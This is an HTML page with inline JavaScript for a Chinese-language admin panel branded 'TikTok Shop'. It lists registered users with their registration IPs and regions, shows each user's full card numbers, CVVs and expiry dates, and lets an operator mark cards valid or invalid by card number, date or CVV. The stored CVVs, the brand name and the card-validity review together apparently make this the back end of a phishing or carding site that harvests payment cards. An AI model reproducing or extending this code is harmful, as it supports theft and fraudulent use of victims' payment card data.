<!doctype html>
<html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin</title><link rel="stylesheet" href="../styles.css"></head>
<body><div id="app"></div><div class="toast"></div><div id="drawerOverlay" class="drawer-overlay"></div><aside id="drawer" class="detail-drawer"></aside><script src="../app.js"></script>
<script>
async function adminApi(path,opt={}){const r=await fetch(path,{credentials:"include",headers:{"Content-Type":"application/json",...(opt.headers||{})},...opt});let d={};try{d=await r.json()}catch{}if(!r.ok)throw new Error(d.error||"请求失败");return d}
async function showLogin(){document.getElementById("app").innerHTML=header()+`<main class="page center"><section class="auth-card"><div class="logo">TikTok <span>Shop</span></div><h2 style="text-align:center">Admin</h2><form id="af"><div class="field"><label>管理员账号</label><input id="aa" type="email" required></div><div class="field"><label>密码</label><input id="ap" type="password" required></div><button class="primary">登录</button></form></section></main>`;af.onsubmit=async e=>{e.preventDefault();try{await adminApi("/api/admin/auth",{method:"POST",body:JSON.stringify({email:aa.value.trim(),password:ap.value})});renderAdmin()}catch(err){toast(err.message)}}}
async function renderAdmin(){let data;try{data=await adminApi("/api/admin/users")}catch{return showLogin()}const users=data.users||[];document.getElementById("app").innerHTML=header()+`<main class="page admin"><div class="panel"><div style="display:flex;justify-content:space-between;align-items:center;gap:10px"><h1>用户管理</h1><div style="display:flex;gap:8px"><button class="secondary" id="arefresh">刷新</button><button class="secondary" id="alo">退出</button></div></div><div class="searchbar"><input id="q" placeholder="搜索邮箱"></div><div style="overflow:auto;margin-top:15px"><table class="user-table"><thead><tr><th>邮箱</th><th>注册日期</th><th>注册地区</th><th>银行卡</th><th>备注</th><th>操作</th></tr></thead><tbody id="tb"></tbody></table></div></div></main>`;function draw(q=""){tb.innerHTML=users.filter(u=>u.email.toLowerCase().includes(q.toLowerCase())).map(u=>`<tr><td>${esc(u.email)}</td><td>${esc(u.created_at)}</td><td>${esc(u.reg_region||u.reg_ip||"—")}</td><td>${u.card_count}</td><td>${esc(u.note||"—")}</td><td><button class="mini" onclick="openUser('${u.id}')">查看</button> <button class="mini" onclick="editNote('${u.id}','${esc(u.note||"")}')">备注</button> <button class="danger" onclick="deleteUser('${u.id}','${esc(u.email)}')">删除账号</button></td></tr>`).join("")}draw();q.oninput=e=>draw(e.target.value);arefresh.onclick=()=>renderAdmin();alo.onclick=async()=>{await adminApi("/api/admin/auth",{method:"DELETE"});showLogin()}}
window.editNote=async(id,note)=>{const v=prompt("编辑备注",note);if(v===null)return;await adminApi("/api/admin/users",{method:"PATCH",body:JSON.stringify({id,note:v})});renderAdmin()}
window.deleteUser=async(id,email)=>{if(!confirm("确定删除账号 "+email+" ？\n该用户的所有银行卡也会一并删除。"))return;try{await adminApi("/api/admin/users",{method:"DELETE",body:JSON.stringify({id})});renderAdmin()}catch(e){toast(e.message)}}
window.openUser=async id=>{const d=await adminApi("/api/admin/cards?user_id="+encodeURIComponent(id));const cs=d.cards||[];const u=d.user||{};drawer.innerHTML=`<div class="modal-head"><h2>${esc(u.email)}</h2><button class="x" onclick="closeDrawer()">×</button></div><div style="overflow:auto"><div style="margin-bottom:12px;color:#999;font-size:13px">注册IP：${esc(u.reg_ip||"—")} · 地区：${esc(u.reg_region||"—")}</div><table class="card-table"><thead><tr><th>银行</th><th>完整卡号</th><th>CVV</th><th>有效期</th><th>网络</th><th>状态</th><th>无效原因</th><th>默认</th><th>操作</th></tr></thead><tbody>${cs.map(c=>`<tr><td>${esc(c.bank)}</td><td style="font-family:monospace">${esc(c.card_number||c.number||c.pan||"—")}</td><td style="font-family:monospace">${esc(c.cvv||"—")}</td><td>${esc(c.expiry)}</td><td>${esc(c.network||"")}</td><td>${esc(c.status)}</td><td>${esc(c.invalid_reason||"—")}</td><td>${c.is_default?"✓":"—"}</td><td><button class="mini" onclick="openStatus('${c.id}','${esc(c.status)}','${esc(c.invalid_reason||"")}','${id}')">改状态</button> <button class="danger" onclick="deleteCard('${c.id}','${id}')">删除</button></td></tr>`).join("")}</tbody></table></div>`;drawer.classList.add("open");drawerOverlay.classList.add("show")}
window.openStatus=(cid,curStatus,curReason,uid)=>{const reasons=(curReason||"").split(",").filter(Boolean);const html=`<div class="modal show" style="position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:80;display:flex;align-items:center;justify-content:center"><div style="background:#111;border:1px solid #333;border-radius:18px;padding:22px;min-width:320px;color:#fff">
 <h3 style="margin:0 0 14px">设置银行卡状态</h3>
 <label style="display:block;margin:8px 0"><input type="radio" name="st" value="valid" ${curStatus==="valid"?"checked":""}> 有效</label>
 <label style="display:block;margin:8px 0"><input type="radio" name="st" value="invalid" ${curStatus==="invalid"?"checked":""}> 无效</label>
 <div style="margin-top:14px;padding:10px;border:1px solid #2b2b2b;border-radius:12px">
   <div style="color:#999;font-size:12px;margin-bottom:8px">无效原因（可多选）</div>
   <label style="display:block;margin:6px 0"><input type="checkbox" name="rs" value="card" ${reasons.includes("card")?"checked":""}> 卡号无效</label>
   <label style="display:block;margin:6px 0"><input type="checkbox" name="rs" value="expiry" ${reasons.includes("expiry")?"checked":""}> 日期无效</label>
   <label style="display:block;margin:6px 0"><input type="checkbox" name="rs" value="cvv" ${reasons.includes("cvv")?"checked":""}> CVV / CVC 无效</label>
 </div>
 <div style="display:flex;gap:10px;justify-content:flex-end;margin-top:16px">
  <button class="secondary" id="stCancel">取消</button>
  <button class="primary" id="stOk" style="width:auto;padding:10px 18px">保存</button>
 </div>
 </div></div>`;
 document.body.insertAdjacentHTML("beforeend",html);
 const modal=document.body.lastElementChild;
 modal.querySelector("#stCancel").onclick=()=>modal.remove();
 modal.querySelector("#stOk").onclick=async()=>{
  const status=[...modal.querySelectorAll('input[name="st"]')].find(i=>i.checked)?.value||"valid";
  const reasons=[...modal.querySelectorAll('input[name="rs"]')].filter(i=>i.checked).map(i=>i.value);
  try{await adminApi("/api/admin/cards",{method:"PATCH",body:JSON.stringify({id:cid,action:"status",status,reasons})});modal.remove();openUser(uid)}catch(e){toast(e.message)}
 };
};
window.closeDrawer=()=>{drawer.classList.remove("open");drawerOverlay.classList.remove("show")};drawerOverlay.onclick=closeDrawer;
window.deleteCard=async(id,uid)=>{if(!confirm("确定删除这张银行卡？"))return;await adminApi("/api/admin/cards",{method:"DELETE",body:JSON.stringify({id})});openUser(uid)}
renderAdmin();
</script></body></html>
